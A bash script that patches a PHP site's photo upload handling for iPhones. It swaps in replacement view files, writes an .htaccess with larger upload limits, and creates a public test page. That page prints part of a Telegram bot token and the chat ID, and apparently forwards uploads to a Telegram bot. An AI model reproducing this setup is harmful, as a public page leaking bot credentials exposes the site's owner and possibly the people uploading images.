#!/bin/bash

echo "🔧 Fixing iPhone Upload Issues..."

# Backup original files
cp views/uploadz2.php views/uploadz2.php.backup
cp views/done.php views/done.php.backup

# Replace with iPhone-compatible versions
cp views/uploadz2_iphone_fix.php views/uploadz2.php
cp views/done_iphone_fix.php views/done.php

# Update PHP configuration for better iPhone support
echo "📝 Updating PHP configuration..."

# Create .htaccess file for better upload handling
cat > .htaccess << 'EOF'
# iPhone Upload Fixes
php_value upload_max_filesize 50M
php_value post_max_size 50M
php_value max_execution_time 300
php_value memory_limit 256M
php_value max_input_time 300

# Enable file uploads
php_flag file_uploads On

# Set proper content types
AddType application/x-httpd-php .php
AddType image/jpeg .jpg .jpeg
AddType image/png .png
AddType image/gif .gif
AddType image/heic .heic
AddType image/heif .heif

# Handle iPhone specific issues
<IfModule mod_rewrite.c>
    RewriteEngine On
    
    # Handle iPhone uploads
    RewriteCond %{HTTP_USER_AGENT} iPhone [NC]
    RewriteCond %{REQUEST_METHOD} POST
    RewriteCond %{CONTENT_TYPE} multipart/form-data
    RewriteRule ^(.*)$ $1 [L]
</IfModule>

# Security headers
<IfModule mod_headers.c>
    Header always set X-Content-Type-Options nosniff
    Header always set X-Frame-Options DENY
    Header always set X-XSS-Protection "1; mode=block"
</IfModule>
EOF

# Create a test script for iPhone uploads
cat > test_iphone_upload.php << 'EOF'
<?php
// Test script for iPhone uploads
session_start();
include 'config/telegram.php';

echo "<h2>iPhone Upload Test</h2>";
echo "<p>This script tests iPhone upload compatibility.</p>";

// Test bot configuration
echo "<h3>Bot Configuration Test</h3>";
echo "Bot Token: " . substr($telegram_bot2_token, 0, 20) . "...<br>";
echo "Chat ID: $telegram_bot2_chat_id<br>";

// Test message
$test_message = "🧪 iPhone Upload Test - " . date('Y-m-d H:i:s');
$result = sendTelegramMessage($telegram_bot2_token, $telegram_bot2_chat_id, $test_message);

if ($result) {
    echo "✅ Test message sent successfully!<br>";
} else {
    echo "❌ Test message failed to send<br>";
}

// Test file upload directory
$uploadDir = 'views/xentryxupload/';
if (is_dir($uploadDir)) {
    echo "✅ Upload directory exists and is writable<br>";
} else {
    echo "❌ Upload directory does not exist<br>";
    mkdir($uploadDir, 0755, true);
    echo "✅ Created upload directory<br>";
}

// Test PHP settings
echo "<h3>PHP Settings Test</h3>";
echo "Upload Max Filesize: " . ini_get('upload_max_filesize') . "<br>";
echo "Post Max Size: " . ini_get('post_max_size') . "<br>";
echo "Max Execution Time: " . ini_get('max_execution_time') . "<br>";
echo "Memory Limit: " . ini_get('memory_limit') . "<br>";

// Test file upload form
echo "<h3>File Upload Test</h3>";
echo '<form action="views/uploadz2.php" method="post" enctype="multipart/form-data">';
echo '<input type="file" name="file" accept="image/*" required><br><br>';
echo '<input type="submit" value="Test Upload">';
echo '</form>';

echo "<hr>";
echo "<p><a href='index.php'>← Back to main page</a></p>";
?>
EOF

echo "✅ iPhone upload fixes applied!"
echo "📱 Test the fixes by visiting: http://yourserver.com/test_iphone_upload.php"
echo "🔄 Restart nginx: sudo systemctl restart nginx"
echo "🔄 Restart PHP: sudo systemctl restart php-fpm"
echo ""
echo "🔍 Key improvements made:"
echo "   - Increased upload limits to 50MB"
echo "   - Added HEIC/HEIF support for iPhone photos"
echo "   - Enhanced error handling and debugging"
echo "   - Added device detection (iPhone vs Android)"
echo "   - Improved Telegram bot error handling"
echo "   - Added fallback message sending if image fails"
